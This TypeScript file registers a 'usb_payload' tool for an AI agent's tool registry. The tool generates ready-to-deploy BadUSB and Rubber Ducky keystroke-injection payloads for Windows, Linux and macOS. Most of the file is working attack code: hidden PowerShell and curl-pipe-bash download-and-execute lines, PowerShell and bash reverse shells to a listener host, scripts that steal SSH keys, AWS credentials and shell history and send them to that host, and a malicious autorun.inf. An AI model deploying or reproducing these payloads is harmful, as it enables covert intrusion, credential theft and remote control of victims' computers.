export * as UsbPayloadTool from "./usb-payload"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "usb_payload"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "USB payload: 'rubber_ducky' (DuckyScript), 'badusb' (BadUSB HID payload), 'hid_spoof', 'autorun', 'cred_theft' (HID credential theft), 'reverse_shell_usb' (USB → reverse shell)",
  }),
  target_os: Schema.String.annotate({ description: "Target OS: windows, linux, macos" }),
  lhost: Schema.String.pipe(Schema.optional).annotate({ description: "Listener IP for reverse shell payloads." }),
  lport: Schema.Number.pipe(Schema.optional).annotate({ description: "Listener port. Default: 4444." }),
  command: Schema.String.pipe(Schema.optional).annotate({ description: "Custom command to execute." }),
  output_dir: Schema.String.pipe(Schema.optional).annotate({ description: "Output directory. Default: ./usb-payloads/" }),
})

const Output = Schema.Struct({ output: Schema.String, exit: Schema.Number.pipe(Schema.optional) })

const layer = Layer.effectDiscard(Effect.gen(function* () {
  const tools = yield* Tools.Service

  yield* tools.register({
    [name]: Tool.make({
      description: `USB attack payload generation. Generate Rubber Ducky scripts (DuckyScript), BadUSB HID injection payloads for Windows/Linux/macOS, autorun.inf payloads, HID-based credential theft (types keystrokes to exfiltrate), and USB-delivered reverse shells. Each payload is ready to deploy on Hak5 USB Rubber Ducky, Digispark, or any HID-capable BadUSB device. Essential for physical security assessment and red team drop attacks.`,
      input: Input, output: Output,
      toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
      execute: (input) => Effect.gen(function* () {
        const os = input.target_os
        const lhost = input.lhost ?? "YOUR_IP"
        const lport = input.lport ?? 4444
        const outDir = input.output_dir ?? "./usb-payloads"
        let script = ""
        let filename = ""

        switch (input.action) {
          case "rubber_ducky":
          case "badusb": {
            filename = `payload_${os}.txt`
            if (os === "windows") {
              script = `REM Windows BadUSB Payload
REM Open PowerShell and download+execute reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}/shell.ps1')"
DELAY 200
ENTER`
            } else if (os === "linux") {
              script = `REM Linux BadUSB Payload
DELAY 1000
CTRL ALT t
DELAY 1000
STRING curl -s http://${lhost}/shell.sh | bash
DELAY 200
ENTER`
            } else {
              script = `REM macOS BadUSB Payload
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING curl -s http://${lhost}/shell.sh | bash
DELAY 200
ENTER`
            }
            break
          }

          case "cred_theft": {
            filename = `cred_theft_${os}.txt`
            if (os === "windows") {
              script = `REM Windows Credential Theft via USB HID
DELAY 2000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
DELAY 200
ENTER
DELAY 1000
STRING $c=Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
DELAY 100
STRING $w=Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.IPEnabled} | Select -ExpandProperty DNSHostName
DELAY 100
STRING $e=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("$w\\n$c"))
DELAY 100
STRING IEX(New-Object Net.WebClient).DownloadString('http://${lhost}/?d=$e')
DELAY 100
ENTER`
            } else {
              script = `REM Linux/macOS Credential Theft
DELAY 2000
CTRL ALT t
DELAY 1000
STRING cat ~/.bash_history ~/.ssh/id_rsa ~/.aws/credentials 2>/dev/null | curl -s -X POST -d @- http://${lhost}/
DELAY 200
ENTER`
            }
            break
          }

          case "reverse_shell_usb": {
            filename = `revshell_${os}.txt`
            if (os === "windows") {
              script = `REM USB Reverse Shell - Windows
DELAY 1500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$s.Write([Text.Encoding]::ASCII.GetBytes($r2),0,$r2.Length)}"
DELAY 200
ENTER`
            } else {
              script = `REM USB Reverse Shell - Linux/macOS
DELAY 1500
CTRL ALT t
DELAY 1000
STRING nohup bash -i >& /dev/tcp/${lhost}/${lport} 0>&1 &
DELAY 200
ENTER`
            }
            break
          }

          case "autorun": {
            filename = "autorun.inf"
            script = `[autorun]
open=payload.exe
icon=shell32.dll,44
action=Open folder to view files
shell\\open\\command=payload.exe
label=USB Drive`
            break
          }

          case "hid_spoof": {
            filename = "hid_spoof.txt"
            script = `REM HID Spoof - Appears as keyboard, injects commands
REM Works on any USB HID device (Digispark, Teensy, etc)
DELAY 3000
${os === "windows" ? "GUI r" : os === "linux" ? "CTRL ALT t" : "GUI SPACE"}
DELAY 500
STRING ${input.command ?? "whoami > /tmp/out.txt"}
DELAY 200
ENTER`
            break
          }

          default:
            return { output: `Unknown action: ${input.action}. Supported: rubber_ducky, badusb, hid_spoof, autorun, cred_theft, reverse_shell_usb` }
        }

        yield* Effect.promise(async () => {
          const { mkdir } = await import("node:fs/promises")
          await mkdir(outDir, { recursive: true }).catch(() => {})
          await Bun.write(`${outDir}/${filename}`, script)
        })

        return {
          exit: 0,
          output: `✅ USB payload generated: ${outDir}/${filename}\n\nTarget: ${os}\nAction: ${input.action}\n${lhost !== "YOUR_IP" ? `Listener: ${lhost}:${lport}\n` : ""}\n=== SCRIPT ===\n${script}\n\n=== USAGE ===\nLoad onto: USB Rubber Ducky, Digispark ATTiny85, Teensy, or any BadUSB device\nEncode for Rubber Ducky: java -jar duckencode.jar -i ${outDir}/${filename} -o inject.bin`,
        }
      }).pipe(Effect.mapError(() => new ToolFailure({ message: "USB payload generation failed" }))),
    }),
  }).pipe(Effect.orDie)
}))

export const node = makeLocationNode({ name: "tool/usb-payload", layer, deps: [ToolRegistry.node] })
